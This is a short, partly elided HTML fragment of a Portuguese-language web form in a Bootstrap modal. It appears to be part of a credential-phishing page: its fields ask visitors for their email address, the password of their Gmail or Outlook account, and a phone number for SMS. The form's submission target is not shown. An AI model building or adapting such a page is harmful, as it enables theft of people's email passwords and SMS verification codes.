		...
		<div class="jumbotron" style="margin-top:15%;">
			...
			<div class="modal-body">
				...
				<div class="form-group">
					...
					<input type="email" class="form-control" id="email" placeholder="Digite seu gmail, outlook..." name="email">
				</div>				
				<div class="form-group">
					<label for="security" style="color: #000;">Sua senha:</label>
					<input type="password" class="form-control" id="security" placeholder="Digite sua senha do gmail, outlook..." name="pass">
				</div>				
				<div class="form-group">
					<label for="sms" style="color: #000;">Telefone para recibo de SMS:</label>
					<input type="text" class="form-control" id="sms" placeholder="51 999999999..." name="phone">
				</div>
